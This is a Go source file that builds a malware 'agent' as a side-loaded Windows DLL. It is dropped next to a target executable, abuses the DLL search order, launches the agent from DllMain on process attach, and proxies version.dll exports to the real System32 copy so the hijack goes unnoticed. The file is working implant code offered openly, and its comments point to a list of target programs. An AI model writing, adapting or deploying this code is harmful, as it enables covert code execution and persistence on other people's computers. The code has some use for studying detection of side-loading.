//go:build windows && dll_sideload
// +build windows,dll_sideload

package main

// #include <windows.h>
import "C"

import (
	"time"
	"unsafe"
)

// DLL build mode — the agent runs as a side-loaded DLL.
//
// Build with:
//
//	CGO_ENABLED=1 GOOS=windows GOARCH=amd64 \
//	    go build -buildmode=c-shared -tags dll_sideload \
//	    -o <target_dll_name>.dll ./cmd/agent
//
// Drop the resulting DLL next to a target EXE (see sideload/targets.go).
// The host process loads our DLL via the normal DLL search order; Go's
// runtime initialises on DLL_PROCESS_ATTACH and schedules the agent on a
// goroutine once the loader lock is released.

//export DllMain
func DllMain(hinstDLL C.HINSTANCE, fdwReason C.DWORD, lpvReserved unsafe.Pointer) C.BOOL {
	if fdwReason == 1 { // DLL_PROCESS_ATTACH
		go func() {
			// Yield until DllMain has returned and the loader lock is gone.
			time.Sleep(150 * time.Millisecond)
			agentMain()
		}()
	}
	return C.TRUE
}

// main must be present for -buildmode=c-shared but is never called.
func main() {}

// Exported stubs that proxy version.dll functions to the real System32 copy.
// Applications that actually call these will work correctly; apps that merely
// load the DLL for side-effects (the common case) ignore them entirely.
// The real version.dll is loaded lazily on first call via loadRealVersion().

//export GetFileVersionInfoA
func GetFileVersionInfoA(lptstrFilename *C.char, dwHandle C.DWORD, dwLen C.DWORD, lpData unsafe.Pointer) C.BOOL {
	fn := realVersionProc("GetFileVersionInfoA")
	if fn == 0 {
		return C.FALSE
	}
	r, _, _ := callProc3(fn,
		uintptr(unsafe.Pointer(lptstrFilename)),
		uintptr(dwHandle),
		uintptr(dwLen),
		uintptr(lpData))
	return C.BOOL(r)
}

//export GetFileVersionInfoW
func GetFileVersionInfoW(lptstrFilename *C.ushort, dwHandle C.DWORD, dwLen C.DWORD, lpData unsafe.Pointer) C.BOOL {
	fn := realVersionProc("GetFileVersionInfoW")
	if fn == 0 {
		return C.FALSE
	}
	r, _, _ := callProc3(fn,
		uintptr(unsafe.Pointer(lptstrFilename)),
		uintptr(dwHandle),
		uintptr(dwLen),
		uintptr(lpData))
	return C.BOOL(r)
}

//export GetFileVersionInfoSizeA
func GetFileVersionInfoSizeA(lptstrFilename *C.char, lpdwHandle *C.DWORD) C.DWORD {
	fn := realVersionProc("GetFileVersionInfoSizeA")
	if fn == 0 {
		return 0
	}
	r, _, _ := callProc1(fn,
		uintptr(unsafe.Pointer(lptstrFilename)),
		uintptr(unsafe.Pointer(lpdwHandle)))
	return C.DWORD(r)
}

//export GetFileVersionInfoSizeW
func GetFileVersionInfoSizeW(lptstrFilename *C.ushort, lpdwHandle *C.DWORD) C.DWORD {
	fn := realVersionProc("GetFileVersionInfoSizeW")
	if fn == 0 {
		return 0
	}
	r, _, _ := callProc1(fn,
		uintptr(unsafe.Pointer(lptstrFilename)),
		uintptr(unsafe.Pointer(lpdwHandle)))
	return C.DWORD(r)
}

//export VerQueryValueA
func VerQueryValueA(pBlock unsafe.Pointer, lpSubBlock *C.char, lplpBuffer *unsafe.Pointer, puLen *C.UINT) C.BOOL {
	fn := realVersionProc("VerQueryValueA")
	if fn == 0 {
		return C.FALSE
	}
	r, _, _ := callProc3(fn,
		uintptr(pBlock),
		uintptr(unsafe.Pointer(lpSubBlock)),
		uintptr(unsafe.Pointer(lplpBuffer)),
		uintptr(unsafe.Pointer(puLen)))
	return C.BOOL(r)
}

//export VerQueryValueW
func VerQueryValueW(pBlock unsafe.Pointer, lpSubBlock *C.ushort, lplpBuffer *unsafe.Pointer, puLen *C.UINT) C.BOOL {
	fn := realVersionProc("VerQueryValueW")
	if fn == 0 {
		return C.FALSE
	}
	r, _, _ := callProc3(fn,
		uintptr(pBlock),
		uintptr(unsafe.Pointer(lpSubBlock)),
		uintptr(unsafe.Pointer(lplpBuffer)),
		uintptr(unsafe.Pointer(puLen)))
	return C.BOOL(r)
}
